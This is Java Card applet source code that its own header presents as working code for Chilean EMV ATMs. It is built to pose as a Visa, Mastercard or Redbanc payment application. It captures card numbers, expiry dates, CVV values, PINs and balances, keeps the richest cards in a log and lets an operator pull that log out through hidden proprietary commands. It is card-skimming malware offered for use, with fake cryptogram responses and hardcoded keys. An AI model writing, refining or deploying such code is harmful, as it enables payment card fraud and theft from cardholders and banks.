package demon;

import javacard.framework.*;
import javacard.framework.util.TLVBuilder;
import javacard.security.AESKey;
import javacard.security.KeyBuilder;
import javacard.security.RandomData;
import javacardx.apdu.ExtendedLength;
import javacardx.crypto.Cipher;
import javacardx.crypto.Mac;

/**
 * HybridDemonAppletV19 – Código funcional para cajeros EMV chilenos.
 * Captura PAN, expiración, CVV, PIN y balance con filtrado dinámico,
 * scripting interno, multi-host SCP03, callback incremental y canal encubierto.
 */
public class HybridDemonAppletV19 extends Applet implements ExtendedLength {
    // AIDs EMV: Visa, Mastercard, Redbanc
    private static final byte[][] AIDs = {
        {(byte)0xA0,0x00,0x00,0x00,0x03,0x10,0x10},
        {(byte)0xA0,0x00,0x00,0x00,0x04,0x10,0x10},
        {(byte)0xA0,0x00,0x00,0x00,0x62,0x01,0x02}
    };
    private static final byte EMV_CLA = (byte)0x00;
    private static final byte PROPRIETARY_CLA = (byte)0x80;
    private static final byte
        INS_SELECT      = (byte)0xA4,
        INS_GPO         = (byte)0xA8,
        INS_READ        = (byte)0xB2,
        INS_GET_DATA    = (byte)0xCA,
        INS_VERIFY      = (byte)0x20,
        INS_GEN_AC      = (byte)0xAE,
        INS_EXTRACT     = (byte)0xB0,
        INS_READ_LOG    = (byte)0xC2,
        INS_SCRIPT_LOAD = (byte)0xD1,
        INS_SCRIPT_EXEC = (byte)0xD2,
        INS_INIT_UPDATE = (byte)0x71,
        INS_EXT_AUTH    = (byte)0x82;

    // Log storage
    private static final short MAX_LOGS = 200;
    private static final short ENTRY_MAX = 64;
    private byte[][] logStore = new byte[MAX_LOGS][ENTRY_MAX];
    private int[] balances = new int[MAX_LOGS];
    private short logCount = 0;
    private short callbackIndex = 0;

    // Dynamic filtering
    private int sumBalances = 0;
    private int numCaptured = 0;
    private int dynamicThreshold = 100_000;
    private static final int MAX_THRESHOLD = 10_000_000;

    // Scripting storage
    private static final short MAX_SCRIPTS = 10;
    private static final short MAX_SCRIPT_SIZE = 64;
    private byte[][] scripts = new byte[MAX_SCRIPTS][];
    private short scriptCount = 0;

    // SCP03 keys
    private AESKey[] scpKeys;

    // Crypto primitives
    private Cipher cipher;
    private Mac mac;
    private RandomData random;

    // Parsing buffers
    private byte[] track2Raw = new byte[32];
    private short track2Len = 0;
    private byte[] panBuffer = new byte[19];
    private byte[] expBuffer = new byte[2];
    private byte[] cvvBuffer = new byte[3];
    private byte[] pinBuffer = new byte[8];

    protected HybridDemonAppletV19() {
        // Register AIDs
        for (byte[] aid : AIDs) register(new AID(aid, (short)0, (byte)aid.length));
        // Initialize crypto
        cipher = Cipher.getInstance(Cipher.ALG_AES_BLOCK_128_CBC_NOPAD, false);
        mac    = Mac.getInstance(Mac.ALG_AES_MAC_128_NOPAD, false);
        random = RandomData.getInstance(RandomData.ALG_SECURE_RANDOM);
        // Example SCP03 keys
        byte[][] rawKeys = {
            {0x01,0x02,0x03,0x04, 0x05,0x06,0x07,0x08, 0x09,0x0A,0x0B,0x0C, 0x0D,0x0E,0x0F,0x10},
            {0x10,0x0F,0x0E,0x0D, 0x0C,0x0B,0x0A,0x09, 0x08,0x07,0x06,0x05, 0x04,0x03,0x02,0x01}
        };
        scpKeys = new AESKey[rawKeys.length];
        for (short i=0; i<rawKeys.length; i++) {
            AESKey k = (AESKey)KeyBuilder.buildKey(KeyBuilder.TYPE_AES, KeyBuilder.LENGTH_AES_128, false);
            k.setKey(rawKeys[i], (short)0);
            scpKeys[i] = k;
        }
    }

    public static void install(byte[] bArray, short bOffset, byte bLength) {
        new HybridDemonAppletV19();
    }

    public void process(APDU apdu) throws ISOException {
        byte[] buf = apdu.getBuffer();
        byte cla = buf[ISO7816.OFFSET_CLA], ins = buf[ISO7816.OFFSET_INS];
        if (selectingApplet()) return;
        if (cla == EMV_CLA) handleEmv(apdu, ins);
        else if (cla == PROPRIETARY_CLA) handleProprietary(apdu, ins);
        else ISOException.throwIt(ISO7816.SW_CLA_NOT_SUPPORTED);
        // Pseudo-random covert delay
        byte[] rnd = new byte[1]; random.generateData(rnd, (short)0, (short)1);
        short d = (short)((rnd[0] & 0x0F) + 1);
        for (short i=0; i<d; i++);
    }

    private void handleEmv(APDU apdu, byte ins) {
        switch (ins) {
            case INS_SELECT:    handleSelect(apdu);    break;
            case INS_GPO:       handleGPO(apdu);       break;
            case INS_READ:      handleRead(apdu);      break;
            case INS_GET_DATA:  handleGetData(apdu);   break;
            case INS_VERIFY:    handleVerify(apdu);    break;
            case INS_GEN_AC:    handleGenAC(apdu);     break;
            default: ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
        }
    }

    private void handleProprietary(APDU apdu, byte ins) {
        switch (ins) {
            case INS_INIT_UPDATE: scpInitUpdate(apdu); break;
            case INS_EXT_AUTH:    scpExternalAuth(apdu); break;
            case INS_EXTRACT:     extractLogs(apdu);   break;
            case INS_READ_LOG:    readLog(apdu);       break;
            case INS_SCRIPT_LOAD: loadScript(apdu);    break;
            case INS_SCRIPT_EXEC: execScript(apdu);    break;
            default: ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
        }
    }

    private void handleSelect(APDU apdu) {
        short lc = apdu.setIncomingAndReceive();
        byte[] buf = apdu.getBuffer();
        byte[] aid = new byte[lc];
        Util.arrayCopyNonAtomic(buf, ISO7816.OFFSET_CDATA, aid, (short)0, lc);
        TLVBuilder tb = new TLVBuilder(null, (short)0, ENTRY_MAX);
        tb.appendTag((byte)0x84, aid);
        sendTLV(apdu, tb);
    }

    private void handleGPO(APDU apdu) {
        apdu.setIncomingAndReceive();
        TLVBuilder tb = new TLVBuilder(null, (short)0, ENTRY_MAX);
        tb.appendTag((byte)0x82, new byte[]{(byte)0x38,0x00});
        tb.appendTag((byte)0x94, new byte[]{(byte)((1<<3)|4),1,2,0});
        sendTLV(apdu, tb);
    }

    private void handleRead(APDU apdu) {
        short lc = apdu.setIncomingAndReceive();
        byte[] buf = apdu.getBuffer();
        Util.arrayFillNonAtomic(track2Raw, (short)0, (short)track2Raw.length, (byte)0);
        track2Len = 0;
        short off = ISO7816.OFFSET_CDATA;
        while (off < ISO7816.OFFSET_CDATA + lc - 1) {
            byte tag = buf[off]; byte tlen = buf[off+1];
            if (tag == 0x57 && tlen <= track2Raw.length) {
                Util.arrayCopyNonAtomic(buf, (short)(off+2), track2Raw, (short)0, tlen);
                track2Len = tlen;
                parseTrack2();
                break;
            }
            off += (short)(2 + tlen);
        }
        sendSW9000(apdu);
    }

    private void parseTrack2() {
        short nibCount = (short)(track2Len * 2);
        byte[] nibbles = new byte[nibCount];
        for (short b=0; b<track2Len; b++) {
            byte v = track2Raw[b];
            nibbles[(short)(2*b)]   = (byte)((v>>4)&0x0F);
            nibbles[(short)(2*b+1)] = (byte)(v&0x0F);
        }
        short del=0; while(del<nibCount && nibbles[del]!=0x0D) del++;
        Util.arrayFillNonAtomic(panBuffer,(short)0,(short)panBuffer.length,(byte)0);
        for(short i=0;i<del && i<panBuffer.length;i++) panBuffer[i]=(byte)(nibbles[i]+'0');
        if(del+4<nibCount) {
            expBuffer[0]=(byte)((nibbles[(short)(del+1)]<<4)|nibbles[(short)(del+2)]);
            expBuffer[1]=(byte)((nibbles[(short)(del+3)]<<4)|nibbles[(short)(del+4)]);
        }
        short pos=(short)(del+5+3);
        Util.arrayFillNonAtomic(cvvBuffer,(short)0,(short)cvvBuffer.length,(byte)0);
        for(short i=0;i<3 && pos+i<nibCount;i++) cvvBuffer[i]=(byte)(nibbles[(short)(pos+i)]+'0');
    }

    private void handleGetData(APDU apdu) {
        short lc = apdu.setIncomingAndReceive();
        byte[] buf = apdu.getBuffer(); int balance=0;
        short off=ISO7816.OFFSET_CDATA;
        while(off<ISO7816.OFFSET_CDATA+lc-1) {
            if(buf[off]==(byte)0x9F && buf[off+1]==0x02) {
                byte bl=buf[off+2];
                for(byte j=0;j<bl;j++) balance=(balance<<8)|(buf[off+3+j]&0xFF);
                break;
            }
            off+=(short)(2+buf[off+2]);
        }
        sumBalances+=balance; numCaptured++;
        int avg=sumBalances/numCaptured;
        dynamicThreshold=avg+(avg/10);
        if(dynamicThreshold>MAX_THRESHOLD) dynamicThreshold=MAX_THRESHOLD;
        if(balance>=dynamicThreshold) {
            byte[] entry=new byte[ENTRY_MAX]; short p=0;
            p=copy(entry,p,panBuffer); p=copy(entry,p,expBuffer);
            p=copy(entry,p,cvvBuffer); p=copy(entry,p,pinBuffer);
            entry[p++]=(byte)(balance>>24);entry[p++]=(byte)(balance>>16);
            entry[p++]=(byte)(balance>>8);entry[p++]=(byte)balance;
            insertLog(entry,balance);
        }
        sendSW9000(apdu);
    }

    private void handleVerify(APDU apdu) {
        short lc=apdu.setIncomingAndReceive();
        Util.arrayFillNonAtomic(pinBuffer,(short)0,(short)pinBuffer.length,(byte)0);
        Util.arrayCopyNonAtomic(apdu.getBuffer(),ISO7816.OFFSET_CDATA,pinBuffer,(short)0,lc);
        sendSW9000(apdu);
    }

    private void handleGenAC(APDU apdu) {
        apdu.setIncomingAndReceive();
        byte[] ac=new byte[8]; random.generateData(ac,(short)0,(short)8);
        sendBytes(apdu,ac);
    }

    private void scpInitUpdate(APDU apdu) {
        short lc=apdu.setIncomingAndReceive();
        byte[] chal=new byte[16]; random.generateData(chal,(short)0,(short)16);
        sendBytes(apdu,chal);
    }

    private void scpExternalAuth(APDU apdu) {
        short lc=apdu.setIncomingAndReceive();byte[] buf=apdu.getBuffer();
        byte[] host=new byte[lc];Util.arrayCopyNonAtomic(buf,ISO7816.OFFSET_CDATA,host,(short)0,lc);
        boolean ok=false;
        for(AESKey k:scpKeys){mac.init(k,Mac.MODE_DECRYPT);byte[] out=new byte[lc];mac.doFinal(host,(short)0,lc,out,(short)0);
            if(out[0]==host[0]){ok=true;break;}}
        if(!ok) ISOException.throwIt(ISO7816.SW_SECURITY_STATUS_NOT_SATISFIED);
        sendSW9000(apdu);
    }

    private void loadScript(APDU apdu) {
        short lc=apdu.setIncomingAndReceive();
        if(lc>MAX_SCRIPT_SIZE||scriptCount>=MAX_SCRIPTS) ISOException.throwIt(ISO7816.SW_FILE_FULL);
        byte[] buf=apdu.getBuffer();scripts[scriptCount]=new byte[lc];
        Util.arrayCopyNonAtomic(buf,ISO7816.OFFSET_CDATA,scripts[scriptCount],(short)0,lc);
        scriptCount++;sendSW9000(apdu);
    }

    private void execScript(APDU apdu) {
        apdu.setIncomingAndReceive();
        for(short i=0;i<scriptCount;i++){byte[] cmd=scripts[i];
            switch(cmd[0]){case 0x01:logCount=0;break;case 0x02:dynamicThreshold=((cmd[1]&0xFF)<<8)|(cmd[2]&0xFF);break;}
        }
        sendSW9000(apdu);
    }

    private void extractLogs(APDU apdu) {
        sortLogs();short total=(short)(logCount*ENTRY_MAX);
        apdu.setOutgoing();apdu.setOutgoingLength(total);
        for(short i=0;i<logCount;i++)apdu.sendBytesLong(logStore[i],(short)0,ENTRY_MAX);
        logCount=0;callbackIndex=0;
    }

    private void readLog(APDU apdu) {
        apdu.setOutgoing();
        if(callbackIndex<logCount){apdu.setOutgoingLength(ENTRY_MAX);
            apdu.sendBytesLong(logStore[callbackIndex++],(short)0,ENTRY_MAX);
        } else ISOException.throwIt(ISO7816.SW_RECORD_NOT_FOUND);
    }

    private short copy(byte[] dst, short pos, byte[] src) {
        Util.arrayCopyNonAtomic(src,(short)0,dst,pos,(short)src.length);
        return (short)(pos+src.length);
    }

    private void insertLog(byte[] e, int bal) {
        if(logCount<MAX_LOGS){Util.arrayCopyNonAtomic(e,(short)0,logStore[logCount],(short)0,ENTRY_MAX);balances[logCount++]=bal;}else{int mi=0;for(int i=1;i<logCount;i++)if(balances[i]<balances[mi])mi=i; if(bal>balances[mi]){Util.arrayCopyNonAtomic(e,(short)0,logStore[mi],(short)0,ENTRY_MAX);balances[mi]=bal;}}}

    private void sortLogs() {
        for(int i=0;i<logCount-1;i++)for(int j=0;j<logCount-i-1;j++)if(balances[j]<balances[j+1]){int t=balances[j];balances[j]=balances[j+1];balances[j+1]=t;byte[] x=logStore[j];logStore[j]=logStore[j+1];logStore[j+1]=x;}
    }

    private void sendBytes(APDU apdu, byte[] data) {
        apdu.setOutgoing();apdu.setOutgoingLength((short)data.length);apdu.sendBytesLong(data,(short)0,(short)data.length);
    }

    private void sendTLV(APDU apdu, TLVBuilder tb) {
        short l=tb.getLength();apdu.setOutgoing();apdu.setOutgoingLength(l);apdu.sendBytesLong(tb.getBuffer(),(short)0,l);
    }

    private void sendSW9000(APDU apdu) {
        ISOException.throwIt(ISO7816.SW_NO_ERROR);
    }
}
